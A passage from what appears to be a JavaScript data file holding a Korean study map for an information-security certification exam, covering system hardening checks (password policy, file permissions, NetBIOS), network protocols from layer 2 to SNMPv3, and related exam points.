    n("netcmd","net 명령 (30회)",["내 컴퓨터에 누가 연결해 있는지, 어떤 폴더가 공유되어 있는지 확인하고 정리하는 일은 윈도우 점검의 기본이기 때문에 net 명령을 알아 두어야 한다. 30회에 출제되었다.","`net session`은 내 컴퓨터에 연결된 세션 목록을 보여 주며, `net session /delete`를 실행하면 모든 세션을 강제로 종료한다.","`net share`는 공유 폴더를 만들고, 삭제하고, 목록을 확인할 때 쓴다."]),
    n("winlog","서비스별 로그 경로 (23회)",["침해사고를 조사할 때는 해당 서비스의 로그가 어디에 남는지 알아야 바로 찾아볼 수 있다. 23회에 출제되었다.","IIS 로그는 `%SystemRoot%\\system32\\LogFiles\\` 아래에 있으며, HTTPERR에는 에러 로그, W3SVC1에는 웹 로그, MSFTPSVC1에는 FTP 로그가 남는다.","DHCP 로그는 `%SystemRoot%\\System32\\dhcp`에, DNS 로그는 `%SystemRoot%\\System32\\dns`에 남는다."],[],1)
   ]),
   n("winevlog","윈도우 이벤트 로그 크기 (29회 서술)",["이벤트 로그 크기가 너무 작으면 필요한 기간의 기록이 덮어써져 사라지기 때문에, 보관 기간에 맞게 크기를 계산해 설정해야 한다. 29회에 서술형으로 출제되었다.","필요한 로그 크기는 `로그 1개 크기 × 하루 개수 × 보관 일수`로 계산한다. 예를 들어 500 × 1,000 × 30 = 15,000,000바이트이다.","설정은 이벤트 뷰어에서 로그를 선택한 뒤 속성에 들어가 최대 로그 크기를 바꾸면 된다."])
  ]),
  n("s1c2","2장 취약점 점검",["정상 구조를 알아도 실제 시스템의 설정이 잘못되어 있으면 공격을 막을 수 없기 때문에, 설정을 하나하나 점검하고 고치는 능력이 필요하다.","2장은 1장의 정상 구조를 기준으로 계정, 파일, 서비스 설정이 안전한지 점검하고 조치하는 방법을 다룬다."],[
   n("rootremote","root 원격 접속 제한 (6회)",["root로 바로 원격 로그인하면 누가 접속했는지 추적할 수 없고, 무차별 대입 공격의 표적이 되기 때문에 root 원격 접속을 막아야 한다. 6회에 출제되었다.","Solaris는 /etc/default/login 파일의 CONSOLE 항목으로 설정한다.","AIX는 /etc/security/user 파일에서 `rlogin=false`로 설정한다.","HP-UX는 /etc/securetty 파일에 console을 설정한다.","Linux는 /etc/pam.d/login에 pam_securetty.so를 설정하고, /etc/securetty에서 pts 항목을 제거한다. 이 내용은 30회에 서술형으로 출제되었다."],[],1),
   n("pwpolicy","패스워드 정책",["비밀번호를 오래 쓰거나 짧게 만들면 추측이나 대입 공격에 쉽게 뚫리기 때문에, 시스템에서 정책으로 강제해야 한다.","이 영역은 비밀번호 사용 기간, 최소 길이, 반복 실패 시 계정 잠금 같은 패스워드 정책 설정을 다룬다."],[
    n("logindefs","/etc/login.defs (13회·26회)",["새 계정이 만들어질 때마다 안전한 비밀번호 정책이 자동으로 적용되게 하려면 기본 정책 파일을 설정해야 한다. 13회와 26회에 출제되었다.","/etc/login.defs에서 PASS_MAX_DAYS는 최대 사용일, PASS_MIN_DAYS는 최소 사용일, PASS_WARN_AGE는 만료 경고일, PASS_MIN_LEN은 최소 길이를 지정한다.","예를 들어 최소 길이를 8자로 하려면 `PASS_MIN_LEN 8`로 설정한다.","shadow에는 계정별로 실제 적용된 값이 들어 있고, login.defs는 새 계정에 적용할 기본 정책이라는 점이 다르다."],[],1),
    n("pwlenos","OS별 최소 길이 (24회 서술)",["운영체제마다 비밀번호 최소 길이를 정하는 파일과 항목 이름이 달라서 구분해 알아 두어야 한다. 24회에 서술형으로 출제되었다.","Solaris는 /etc/default/passwd 파일에서 `PASSLENGTH=8`로 설정한다.","Linux는 /etc/security/pwquality.conf 파일에서 `minlen=8`로 설정한다.","AIX는 /etc/security/user 파일에서 `minlen=8`로 설정한다.","HP-UX는 /etc/default/security 파일에서 `MIN_PASSWORD_LENGTH=8`로 설정한다."]),
    n("pamtally","계정 잠금 pam_tally (14회·18회 서술)",["비밀번호를 무한히 시도할 수 있으면 무차별 대입 공격에 뚫리기 때문에, 일정 횟수 이상 실패하면 계정을 잠가야 한다. 14회와 18회에 서술형으로 출제되었다.","계정 잠금은 /etc/pam.d/system-auth 파일에 pam_tally 모듈을 설정해서 적용한다.","`deny=5`는 5회 실패하면 잠그고, `unlock_time=120`은 120초 뒤에 잠금을 해제한다.","no_magic_root는 root 계정은 잠그지 않도록 하고, reset은 로그인에 성공하면 실패 횟수를 0으로 되돌린다."])
   ]),
   n("fileperm","파일 권한 점검",["중요 파일의 권한이 느슨하면 일반 사용자가 이를 읽거나 바꿔 시스템을 장악할 수 있으므로, 권한 점검은 취약점 점검의 핵심이다.","이 영역은 중요 파일의 권한과 SetUID·SetGID처럼 위험한 권한이 붙은 파일을 찾아 조치하는 방법을 다룬다."],[
    n("pwfileperm","passwd · shadow 권한",["계정 파일의 권한이 잘못되면 다른 사용자가 비밀번호 해시를 읽거나 계정 정보를 바꿀 수 있으므로 정해진 권한을 지켜야 한다.","/etc/passwd는 644, /etc/shadow는 400 권한이어야 하며, 소유자는 root여야 한다. 소유자는 `chown root`로, 권한은 `chmod`로 조치한다."]),
    n("suidcheck","SUID·SGID 파일 점검 (24회 서술)",["SUID·SGID가 잘못 설정된 파일은 일반 사용자가 root 권한을 얻는 통로가 되기 때문에 주기적으로 찾아 점검해야 한다. 24회에 서술형으로 출제되었다.","root 소유의 SUID·SGID 파일은 `find / -user root -type f \\( -perm -4000 -o -perm -2000 \\) -xdev -exec ls -al {} \\;` 명령으로 찾는다.","불필요한 파일은 `chmod -s 파일` 명령으로 특수 권한을 제거한다."]),
    n("worldw","기타 점검 (30회 서술)",["누구나 쓸 수 있는 파일, 방치된 로그인 세션, 느슨한 기본 권한은 모두 다른 사용자가 악용할 수 있는 빈틈이기 때문에 함께 점검한다. 30회에 서술형으로 출제되었다.","누구나 쓸 수 있는(world writable) 파일은 `find / -type f -perm -2` 명령으로 찾는다.","세션 타임아웃은 /etc/profile에 `TMOUT=600`과 `export TMOUT`을 넣어 설정한다.","새 파일의 기본 권한을 `rw-r--r--`로 하려면 umask를 022로 설정한다."])
   ]),
   n("netbios","NetBIOS 바인딩 제거 (23회 서술)",["TCP/IP와 NetBIOS가 묶여 있으면 인터넷에서 내 컴퓨터의 공유 자원에 접근할 수 있기 때문에, 이 연결을 끊어야 한다. 23회에 서술형으로 출제되었다.","NetBIOS 바인딩 제거는 TCP/IP 위에서 NetBIOS가 동작하지 않도록 설정하는 조치이다.","설정 방법은 ncpa.cpl을 실행한 뒤 연결 속성, TCP/IP, 고급, WINS 탭으로 들어가 'NetBIOS over TCP/IP 사용 안 함'을 선택하는 것이다."]),
   n("patch","패치 관리 (27회)",["이미 알려진 취약점은 공격 방법도 널리 퍼져 있으므로, 패치를 하지 않으면 쉽게 공격당한다. 27회에 출제되었다.","운영체제는 최신 핫픽스(Hotfix)를 설치해서 알려진 취약점을 제거한다.","백신은 DB와 엔진을 주기적으로 업데이트(Update)해야 한다."],[],1)
  ])
 ]),
 n("s2","2과목 네트워크 보안",["네트워크 공격은 모두 TCP/IP가 원래 어떻게 동작하는지를 알아야 이해할 수 있기 때문에, 이 과목은 정상 동작부터 차례대로 쌓아 올리는 방식으로 공부하는 것이 좋다.","2과목은 TCP/IP의 정상 동작을 먼저 정리하고, 그 동작을 악용하는 공격을 본 뒤, 이를 막는 보안 기술과 네트워크 장비의 설정 점검까지 다룬다."],[
  n("s2c1","1장 네트워크 일반",["모든 네트워크 공격은 이 정상 동작을 속이거나 과부하를 일으키는 방식이므로, 계층별 정상 동작을 먼저 알아야 공격을 이해할 수 있다.","1장은 네트워크의 정상 동작을 계층별로 정리한 장이다.","데이터를 보낼 때는 계층을 내려가면서 헤더를 한 겹씩 씌우는데, 이를 캡슐화라고 한다. 받을 때는 바깥 헤더부터 차례로 벗겨 내며, 모양은 `[MAC 헤더 [IP 헤더 [TCP 헤더 [데이터]]]]`와 같다."],[
   n("l1","1계층 물리",["모든 통신은 결국 신호로 바뀌어 전달되므로, 1계층은 네트워크의 가장 밑바탕이 되는 단계이다.","1계층 물리 계층은 0과 1을 전기·빛·전파 신호로 바꿔 보내는 계층이며, 데이터 단위는 비트이다.","이 계층의 장비는 허브와 리피터이며, 받은 신호를 모든 포트로 그대로 보낸다."]),
   n("l2","2계층 데이터링크",["같은 네트워크 안에서 프레임이 어디로 가는지가 이 계층에서 정해지기 때문에, Switch Jamming이나 ARP 스푸핑처럼 이 계층을 노리는 공격을 이해하려면 먼저 정상 동작을 알아야 한다.","2계층 데이터링크 계층의 데이터 단위는 프레임이며, 이 단계에서 MAC 주소가 붙는다.","이 계층의 장비는 스위치와 브리지이며, MAC 주소까지만 보고 판단한다.","이 계층을 노리는 대표 공격은 Switch Jamming과 ARP 스푸핑이다."],[
    n("swfunc","스위치 기능 5가지",["스위치가 프레임을 원하는 포트로만 보내는 원리를 알아야, MAC 주소 테이블을 노리는 Switch Jamming 같은 공격을 이해할 수 있다.","스위치는 같은 네트워크 안에서 MAC 주소를 보고 목적지 포트로만 프레임을 보내는 2계층 장비이다.","반면 허브는 받은 프레임을 모든 포트로 복사해 보낸다."],[
     n("learning","Learning",["스위치가 어느 포트에 어떤 장비가 있는지 알아야 정확히 전달할 수 있기 때문에, 이 학습 과정이 모든 동작의 출발점이 된다.","Learning은 프레임이 들어온 포트와 그 프레임의 출발지 MAC 주소를 MAC 주소 테이블에 저장하는 기능이다."]),
     n("flooding","Flooding",["스위치가 목적지를 아직 모를 때도 프레임을 전달해야 하므로 이 기능이 필요하며, Switch Jamming 공격이 바로 이 동작을 강제로 일으킨다.","Flooding은 목적지 MAC 주소가 테이블에 없을 때, 프레임이 들어온 포트를 뺀 모든 포트로 보내는 기능이다."]),
     n("forwarding","Forwarding",["필요한 포트로만 보내야 불필요한 트래픽이 줄고 다른 사람이 엿보기 어려워지므로, 이것이 스위치의 기본 전달 방식이다.","Forwarding은 목적지 MAC 주소가 테이블에 있을 때 해당 포트로만 프레임을 보내는 기능이다."]),
     n("filtering","Filtering",["같은 쪽에 있는 장비끼리의 통신을 다른 포트로 퍼뜨리지 않아야 불필요한 전송을 막을 수 있다.","Filtering은 목적지가 프레임이 들어온 포트와 같은 쪽에 있으면 다른 포트로 보내지 않는 기능이다."]),
     n("aging","Aging",["장비가 빠지거나 옮겨 가도 오래된 정보가 남아 있으면 엉뚱한 포트로 보내게 되므로, 테이블을 주기적으로 정리해야 한다.","Aging은 일정 시간 동안 쓰이지 않은 MAC 주소 테이블 항목을 지우는 기능이다."])
    ],1),
    n("swmode","스위치 전송 방식",["스위치가 프레임을 언제 내보내는지에 따라 속도와 오류 검사 수준이 달라지므로, 세 방식을 구분할 줄 알아야 한다.","스위치 전송 방식은 스위치가 프레임을 어느 시점에 내보내는지에 따라 나눈 것이다.","빨리 내보낼수록 오류 검사는 적게 한다."],[
     n("snf","Store and Forward",["오류가 있는 프레임을 확실히 걸러 내야 할 때 쓰는 방식으로, 가장 정확하다는 점이 핵심이다.","Store and Forward는 프레임 전체를 받아 오류(CRC)를 검사한 뒤 내보내는 방식이다.","가장 느리지만 가장 정확하다."]),
     n("cut","Cut Through",["가장 빠른 방식이지만 오류 검사를 하지 않는다는 점이 다른 방식과 구분되는 핵심이다.","Cut Through는 프레임에서 목적지 MAC 주소만 읽고 바로 내보내는 방식이다.","가장 빠르지만, 오류가 있는 프레임도 그대로 보낸다."]),
     n("ffree","Fragment Free",["속도와 정확성을 절충한 방식이라, Cut Through와 Store and Forward 사이에 놓고 기억하면 된다.","Fragment Free는 프레임의 앞 64바이트까지 받은 뒤 내보내는 방식이다.","충돌로 깨진 짧은 프레임(64바이트 미만)을 걸러 낼 수 있으며, 속도와 정확성은 중간 수준이다."])
    ],1),
    n("vlan","VLAN (Virtual LAN, 가상 랜)",["하나의 스위치에 연결된 장비들을 용도별로 나눠야 보안과 성능을 함께 챙길 수 있기 때문에 VLAN이 쓰인다.","VLAN(Virtual LAN, 가상 랜)은 스위치 하나를 논리적으로 여러 네트워크로 나누는 기술이다."],[
     n("vlanwhy","VLAN 목적",["VLAN을 왜 쓰는지는 보안·크기·성능 세 가지로 묶어서 서술하라는 형태로 나오기 쉬우므로, 서로 이어지는 흐름으로 기억해 두는 것이 좋다.","보안 측면에서 VLAN은 네트워크 자원에 대한 접근을 제한한다.","크기 측면에서 VLAN은 브로드캐스트 도메인의 크기를 줄인다.","성능 측면에서 VLAN은 브로드캐스트 트래픽이 줄어들어 전체 성능이 좋아진다.","흐름으로 정리하면, 네트워크를 나누면 접근이 막히고(보안), 브로드캐스트 범위가 작아지며(크기), 그래서 빨라진다(성능)."],[],1),
     n("vlantype","VLAN 구성 방식",["VLAN을 어떤 기준으로 나누느냐에 따라 관리 방법과 장단점이 달라지므로 방식별 특징을 구분해야 한다.","VLAN 구성 방식은 무엇을 기준으로 VLAN을 정하는지에 따라 나뉜다."],[
      n("vport","포트 기반",["가장 널리 쓰이는 방식이므로 VLAN 구성 방식 가운데 기본으로 알아 두어야 한다.","포트 기반 VLAN은 스위치 포트별로 VLAN을 할당하는 방식이다.","정적 VLAN에 해당하며, 가장 일반적인 방식이다."]),
      n("vmac","MAC 기반",["장비가 어느 포트에 꽂히든 같은 VLAN에 속하게 할 수 있지만, 관리 부담이 크다는 점을 함께 기억해야 한다.","MAC 기반 VLAN은 호스트의 MAC 주소로 VLAN을 정하는 방식이며, 동적 VLAN에 해당한다.","모든 MAC 주소를 등록하고 관리하기 어렵다는 단점이 있다."]),
      n("vip","IP 기반",["VLAN을 나누는 기준이 여러 가지라는 점을 이해하기 위해 다른 방식과 나란히 알아 둔다.","IP 기반 VLAN은 네트워크 주소(IP)별로 VLAN을 구성하는 방식이다."]),
      n("vproto","프로토콜 기반",["VLAN을 나누는 기준이 여러 가지라는 점을 이해하기 위해 다른 방식과 나란히 알아 둔다.","프로토콜 기반 VLAN은 같은 통신 프로토콜을 쓰는 장비끼리 통신하도록 구성하는 방식이다."])
     ],1)
    ]),
    n("arp","ARP (Address Resolution Protocol)",["2계층은 MAC 주소가 있어야 프레임을 보낼 수 있는데 사용자는 보통 IP 주소만 알기 때문에, 둘을 이어 주는 ARP가 반드시 필요하다. 이 정상 동작을 알아야 ARP 스푸핑을 이해할 수 있다.","ARP(Address Resolution Protocol)는 IP 주소로 MAC 주소를 알아내는 프로토콜이다.","교재에 따라 3계층으로 보기도 하지만, 이 지도에서는 MAC 주소를 다루므로 2계층에 둔다."],[
     n("arpreq","ARP Request",["상대의 MAC 주소를 모르는데 2계층은 목적지 MAC 주소 없이 프레임을 보낼 수 없기 때문에, 먼저 네트워크 전체에 물어보는 단계가 필요하다.","ARP Request는 목적지 MAC 주소를 `FF:FF:FF:FF:FF:FF`(브로드캐스트)로 정해 네트워크 전체에 묻는 메시지이다."],[],1),
     n("arprep","ARP Reply",["질문에 대한 답이 돌아와야 IP와 MAC 주소를 짝지을 수 있으며, ARP 스푸핑은 바로 이 응답을 위조하는 공격이다.","ARP Reply는 찾는 IP 주소를 가진 장비만 자기 MAC 주소를 담아 보내는 응답이다."]),
     n("arpcache","ARP 캐시 테이블",["매번 브로드캐스트로 물어보지 않으려고 결과를 저장해 두는데, ARP 스푸핑이 바로 이 표를 바꿔 놓기 때문에 중요하다.","ARP 캐시 테이블은 알아낸 IP 주소와 MAC 주소의 쌍을 저장하는 표이다."])
    ],1),
    n("rarp","RARP (Reverse ARP)",["자기 IP 주소를 저장해 둘 곳이 없는 장비도 네트워크에 참여할 수 있어야 하므로 ARP와 반대 방향의 프로토콜이 필요했다.","RARP(Reverse ARP)는 ARP의 반대로, MAC 주소로 IP 주소를 알아내는 프로토콜이다.","하드디스크가 없는 장비나 네트워크로 부팅하는 장비가 사용한다."],[],1),
    n("promisc","Promiscuous Mode",["네트워크 카드는 원래 자기에게 온 프레임만 받는데, 이 모드를 켜면 남의 통신까지 볼 수 있으므로 스니핑과 침입 탐지 모두에서 중요하다.","Promiscuous Mode는 네트워크 카드가 자기에게 오지 않은 프레임까지 받아들이는 모드이다.","스니핑 공격에 쓰이며, NIDS도 이 모드로 패킷을 수집한다."])
   ]),
   n("l3","3계층 네트워크",["서로 다른 네트워크 사이로 패킷이 길을 찾아가는 일이 이 계층에서 이루어지므로, Smurf·Land·Teardrop 같은 공격과 IPSec 같은 보안 기술을 이해하는 바탕이 된다.","3계층 네트워크 계층의 데이터 단위는 패킷이며, 이 단계에서 IP 주소가 붙는다.","이 계층의 장비는 라우터이며, IP 주소까지 보고 판단한다.","이 계층을 노리는 공격은 Smurf, Land, Teardrop이고, 이 계층의 보안 기술은 IPSec이다."],[
    n("frag","프래그먼트 (IP 단편화)",["패킷을 나누고 다시 합치는 과정을 알아야 Teardrop처럼 조각 정보를 조작하는 공격을 이해할 수 있다.","프래그먼트(IP 단편화)는 패킷이 MTU(이더넷은 보통 1500바이트)보다 클 때 3계층에서 여러 조각으로 나누는 것이다.","받는 쪽은 Fragment Offset 값을 보고 조각들을 다시 합친다.","프래그먼트는 계층의 데이터 단위가 아니라, 패킷을 나눈 조각이라는 점에 주의해야 한다."],[],1),
    n("icmpg","ICMP (Internet Control Message Protocol)",["통신이 잘 되는지 확인하고 문제를 알려 주는 기능이 필요하며, Smurf 같은 공격이 이 ICMP를 악용하기 때문에 정상 동작을 알아 두어야 한다.","ICMP(Internet Control Message Protocol)는 네트워크 상태를 확인하고 오류를 알리는 3계층 프로토콜이다."],[
     n("echo","Echo Request · Reply",["상대 장비가 살아 있는지 확인하는 가장 기본적인 방법이며, 이 요청과 응답을 대량으로 일으키는 공격이 많아 정상 흐름을 알아야 한다.","Echo Request와 Echo Reply는 `ping`이 쓰는 ICMP 메시지이다.","Echo Request로 묻고, Echo Reply로 답한다."]),
     n("dbcast","Directed Broadcast",["외부에서 한 네트워크 전체로 신호를 보낼 수 있다는 점이 Smurf 공격의 증폭 수단이 되기 때문에 중요하다.","Directed Broadcast는 외부 네트워크에서 특정 네트워크 전체를 대상으로 보내는 브로드캐스트이다.","답안에 쓸 때 철자를 Directed로 정확히 써야 한다."],[],1)
    ]),
    n("routing","라우팅 프로토콜",["라우터들이 길 정보를 서로 나눠야 패킷이 목적지까지 갈 수 있으므로, 그 규칙의 종류와 특징을 구분해야 한다.","라우팅 프로토콜은 3계층 장비인 라우터끼리 목적지까지 가는 길 정보를 주고받는 규칙이다.","AS 안에서 쓰는지, AS 사이에서 쓰는지에 따라 나뉜다."],[
     n("as","AS (Autonomous System, 자율 시스템)",["라우팅 프로토콜을 내부용(IGP)과 외부용(EGP)으로 나누는 기준이 AS이므로 먼저 개념을 알아야 한다.","AS(Autonomous System, 자율 시스템)는 한 기관이 직접 관리하는 네트워크 덩어리이다.","KT 네트워크나 큰 대학·회사 네트워크가 그 예이며, 각 AS는 고유한 AS 번호를 받는다.","인터넷은 수많은 AS가 서로 연결된 것이다."]),
     n("igp","IGP (Interior Gateway Protocol, 내부)",["한 기관 안에서 길을 찾는 규칙과 기관 사이에서 길을 찾는 규칙은 다르기 때문에, 내부용을 따로 구분한다.","IGP(Interior Gateway Protocol)는 AS 안에서 길을 찾는 라우팅 프로토콜이다."],[
      n("rip","RIP (Routing Information Protocol)",["가장 단순한 라우팅 프로토콜로, 홉 수 제한 같은 특징이 시험에서 구분 포인트가 된다.","RIP(Routing Information Protocol)는 거리 벡터 방식의 프로토콜이며, 메트릭으로 홉 수를 쓴다.","최대 15홉까지만 갈 수 있으며, 16홉은 도달할 수 없는 것으로 본다.","작은 네트워크에 쓰인다."],[],1),
      n("ospf","OSPF (Open Shortest Path First)",["RIP로는 감당하기 어려운 큰 네트워크를 위해 만들어졌으므로, RIP와 비교해서 기억하면 된다.","OSPF(Open Shortest Path First)는 링크 상태 방식의 프로토콜이며, 다익스트라 알고리즘으로 최단 경로를 계산한다.","RIP의 단점을 개선한 것으로, 크고 복잡한 네트워크에 쓴다."],[],1),
      n("eigrp","EIGRP (Enhanced Interior Gateway Routing Protocol)",["여러 요소를 함께 따져 경로를 고르는 프로토콜이므로, 메트릭 항목을 RIP·OSPF와 구분해 알아 두어야 한다.","EIGRP(Enhanced Interior Gateway Routing Protocol)는 시스코의 IGRP를 개선한 프로토콜이다.","메트릭으로 대역폭, 지연, 신뢰도, 부하, MTU, 홉 수를 사용한다."],[],1)
     ],1),
     n("egp","EGP (Exterior Gateway Protocol, 외부)",["서로 다른 기관의 네트워크가 연결되어야 인터넷이 되므로, AS와 AS 사이의 길 찾기 규칙이 따로 필요하다.","EGP(Exterior Gateway Protocol)는 AS와 AS 사이에서 길을 찾는 라우팅 프로토콜이다."],[
      n("bgp","BGP (Border Gateway Protocol)",["인터넷 전체가 AS의 연결로 이루어져 있어, AS 사이의 길 정보를 주고받는 대표 프로토콜로 알아 두어야 한다.","BGP(Border Gateway Protocol)는 AS 사이에서 쓰는 외부 라우팅 프로토콜이다.","예를 들어 KT와 SK 네트워크가 서로 길 정보를 주고받을 때 BGP를 쓴다."])
     ])
    ],1)
   ]),
   n("l4","4계층 전송",["포트 번호와 연결 상태가 이 계층에서 관리되므로, SYN Flooding·포트 스캔·세션 하이재킹 같은 공격을 이해하려면 이 계층의 정상 동작을 먼저 알아야 한다.","4계층 전송 계층의 데이터 단위는 TCP에서는 세그먼트, UDP에서는 데이터그램이다.","이 계층에서 포트 번호와 SEQ·ACK 번호가 붙는다.","이 계층을 노리는 공격은 SYN Flooding, 포트 스캔, 세션 하이재킹이다."],[
    n("tcp","TCP (Transmission Control Protocol)",["데이터가 빠짐없이 순서대로 도착해야 하는 서비스는 TCP를 쓰며, TCP의 연결 과정이 여러 공격의 대상이 된다.","TCP(Transmission Control Protocol)는 연결을 먼저 맺고, 순서를 맞추고, 빠진 데이터는 다시 보내는 프로토콜이다.","웹과 이메일이 TCP를 쓰는 예이다."]),
    n("flags","TCP 플래그",["포트 스캔과 각종 공격은 플래그 조합을 바꿔 보내는 방식이 많으므로, 각 플래그의 뜻을 정확히 알아야 한다.","TCP 플래그는 TCP 헤더에서 패킷의 역할을 알려 주는 표시이다.","SYN은 연결 요청, ACK는 수신 확인, FIN은 정상 종료, RST는 강제 종료, PSH는 즉시 전달, URG는 긴급을 뜻한다."]),
    n("seq","SEQ · ACK 번호 (Sequence · Acknowledgment)",["SEQ와 ACK 번호를 알아내면 남의 연결을 가로챌 수 있으므로(세션 하이재킹), 번호가 어떻게 이어지는지 계산할 줄 알아야 한다.","SEQ 번호는 보내는 쪽 자신의 번호이다.","ACK 번호는 상대가 보낸 번호에 1을 더한 값으로, 다음에 받을 번호를 뜻한다.","예를 들어 클라이언트가 SEQ 4551을 보내면, 서버는 SEQ 7311·ACK 4552로 답하고, 클라이언트는 다시 SEQ 4552·ACK 7312로 보낸다.","표가 주어지면 보내는 쪽이 누구인지부터 확인하고 번호를 읽어야 한다."],[],1),
    n("3way","3-Way Handshake",["TCP 연결이 맺어지는 정상 과정을 알아야 SYN Flooding이나 포트 스캔이 이 과정의 어디를 악용하는지 이해할 수 있다.","3-Way Handshake는 SYN, SYN+ACK, ACK의 세 단계로 TCP 연결을 맺는 과정이다.","서버가 보내는 SYN+ACK는 \"네 번호를 받았다(ACK)\"는 뜻과 \"내 시작 번호는 이것이다(SYN)\"라는 뜻을 한 번에 담은 것이다.","열린 포트는 SYN+ACK로 응답하고, 닫힌 포트는 RST+ACK로 응답한다."],[],1),
    n("udp","UDP (User Datagram Protocol)",["UDP는 보낸 사람을 확인하지 않기 때문에 출발지 위조가 쉬워 반사 공격에 자주 악용되므로, 그 특징을 정확히 알아야 한다.","UDP(User Datagram Protocol)는 연결을 맺지 않고 데이터그램을 하나씩 보내는 프로토콜이다.","순서 보장, 재전송, 발신자 확인이 없어서 출발지를 위조하기 쉽고, 그래서 반사 공격에 쓰인다.","DNS, SNMP, NTP, 영상 통화가 UDP를 쓰는 예이다."],[],1)
   ]),
   n("l7","5~7계층 응용",["사용자가 실제로 쓰는 서비스가 이 계층에 있으므로, 웹 공격이나 SNMP 관련 문제 등 많은 문제가 이 계층의 규칙에서 출발한다.","5~7계층 응용 계층의 데이터 단위는 메시지(데이터)이다.","HTTP, DNS, FTP, SMTP, SNMP 등 사용자가 쓰는 서비스가 이 계층에 속한다.","DNS와 FTP는 3과목 1장에서 다루며, 지도에서는 점선으로 연결되어 있다."],[
    n("httpg","HTTP (HyperText Transfer Protocol) 규칙",["웹 공격은 대부분 HTTP의 기본 규칙을 악용하므로, 공격을 보기 전에 정상 규칙을 먼저 알아야 한다.","이 묶음은 웹 공격이 악용하는 HTTP의 기본 규칙을 정리한 것이다."],[
     n("crlf","CRLF (Carriage Return · Line Feed)",["HTTP는 줄바꿈으로 헤더와 본문을 구분하기 때문에, 줄바꿈 문자를 끼워 넣는 공격을 이해하려면 이 규칙을 알아야 한다.","CRLF(Carriage Return · Line Feed)는 줄바꿈 문자이다. CR(`0D`)은 커서를 줄 맨 앞으로 옮기고, LF(`0A`)는 다음 줄로 옮긴다.","CRLF가 두 번 연속으로 나오면(`0D0A0D0A`) HTTP 헤더가 끝난 것으로 본다."],[],1),
     n("clte","본문 끝 판단",["서버들이 본문의 끝을 서로 다르게 판단하면 요청이 엉뚱하게 나뉘는 문제가 생기므로, 본문의 끝을 알리는 방식을 알아 두어야 한다.","HTTP 요청 본문이 어디서 끝나는지 알리는 방식에는 Content-Length와 Transfer-Encoding: chunked 두 가지가 있다."],[
      n("cl","Content-Length",["본문 끝을 알리는 두 방식 중 하나로, 다른 방식과 함께 쓰일 때 해석 차이가 생길 수 있어 알아 두어야 한다.","Content-Length는 본문 전체의 길이를 미리 알려 주는 헤더이다."]),
      n("chunked","Transfer-Encoding: chunked",["본문 끝을 알리는 두 방식 중 하나로, Content-Length와 함께 쓰일 때 해석 차이가 생길 수 있어 알아 두어야 한다.","`Transfer-Encoding: chunked`는 본문을 조각으로 나눠 보내면서 조각마다 크기를 적고, 크기가 0인 조각으로 본문의 끝을 알리는 방식이다."])
     ],1),
     n("cookie","쿠키 자동 전송",["브라우저가 쿠키를 자동으로 붙여 보내는 성질 때문에 사용자가 원하지 않은 요청도 로그인된 상태로 처리될 수 있으므로, 이 규칙과 그 대책인 SameSite 속성을 알아야 한다.","브라우저는 요청의 목적지 도메인에 맞는 쿠키를 자동으로 붙여 보내며, 그 요청을 만든 페이지가 어디인지는 보지 않는다.","SameSite 속성이 Strict이면 다른 사이트에서 온 요청에 쿠키를 붙이지 않고, Lax이면 링크 이동에만 붙이며, None이면 항상 붙인다."],[],1)
    ]),
    n("snmp","SNMP (Simple Network Management Protocol)",["많은 네트워크 장비를 한곳에서 관리하려면 상태를 모아 보는 프로토콜이 필요하며, 설정이 허술하면 장비 정보가 새어 나갈 수 있어 시험에 자주 나온다.","SNMP(Simple Network Management Protocol)는 네트워크 장비의 상태를 감시하고 설정을 관리하는 프로토콜이다."],[
     n("snmpcomp","구성 요소",["SNMP의 동작은 누가 묻고 누가 답하는지로 설명되므로, 세 구성 요소의 역할을 먼저 구분해야 한다.","Manager는 장비를 감시하는 관리 서버이다.","Agent는 장비 안에서 정보를 제공하는 프로그램이다.","MIB는 장비 정보를 담은 데이터베이스이다."]),
     n("polling","폴링 · UDP 161",["SNMP의 두 통신 방향 가운데 관리 서버가 먼저 묻는 방식이며, 포트 번호 161이 자주 출제된다.","폴링은 Manager가 Agent에게 정보를 요청하는 방식이다.","이때 Agent는 UDP 161번 포트로 요청을 받는다."],[],1),
     n("trap","이벤트 리포팅 · UDP 162",["장비에 문제가 생기면 관리 서버가 묻기 전에 바로 알아야 하므로, 장비가 먼저 알리는 방식이 필요하며 포트 번호 162가 자주 출제된다.","이벤트 리포팅은 Agent가 Trap 메시지로 Manager에게 먼저 알리는 방식이다.","이때 Manager는 UDP 162번 포트로 받는다."],[],1),
     n("snmpver","버전",["버전에 따라 보안 수준이 크게 달라서, 어떤 버전을 써야 안전한지가 점검 항목과 시험 문제로 나온다.","SNMP v1과 v2c는 커뮤니티 스트링을 평문으로 보낸다.","SNMP v3는 인증과 암호화를 지원한다."]),
     n("snmpv3","SNMPv3 보안 매개변수",["SNMPv3가 어떤 공격을 어떤 항목으로 막는지를 묻는 문제가 6회에 출제되었으므로, 항목 이름과 막는 공격을 짝지어 기억해야 한다.","SNMPv3 보안 매개변수는 메시지 안의 msgSecurityParameters 영역에 들어 있는 보안 관련 값들이다.","문제에서는 매개변수의 이름만 보고 그것이 막는 공격을 찾게 한다."],[
      n("v3time","EngineID · Boots · Time",["공격자가 예전에 가로챈 정상 메시지를 다시 보내도 받아들여지면 안 되므로, 메시지가 만들어진 시점을 확인하는 값이 필요하다.","EngineID, Boots, Time 값은 메시지가 언제 만들어졌는지 확인해 오래된 메시지를 버리는 데 쓰인다.","이 값들이 막는 공격은 재전송 공격이다."],[],1),
      n("v3auth","UserName · AuthenticationParameters",["보낸 사람이 진짜인지, 내용이 중간에 바뀌지 않았는지 확인하지 않으면 위조된 명령이 장비에 적용될 수 있기 때문에 필요하다.","UserName과 AuthenticationParameters는 보낸 사람을 인증하고 무결성 확인값을 붙이는 데 쓰인다.","이 값들이 막는 공격은 메시지 위변조 공격이다."],[],1),
      n("v3priv","PrivacyParameters",["v1·v2c처럼 내용이 평문으로 오가면 중간에서 엿볼 수 있으므로, 내용을 암호화하는 값이 필요하다.","PrivacyParameters는 메시지 내용을 암호화하는 데 쓰인다.","이 값이 막는 공격은 도청(스니핑) 공격이다."],[],1)
     ],1)
    ],1),
    n("syslog","Syslog",["장비에서 일어난 일을 한곳에 모아 두어야 침해 사고가 났을 때 원인을 추적할 수 있기 때문에 Syslog가 쓰인다.","Syslog는 장비의 상황과 변화를 기록하는 프로토콜이다.","이벤트가 생기면 장비는 자기 로그 파일에 저장하면서 동시에 Syslog 서버로도 보낸다."])
   ])
  ]),
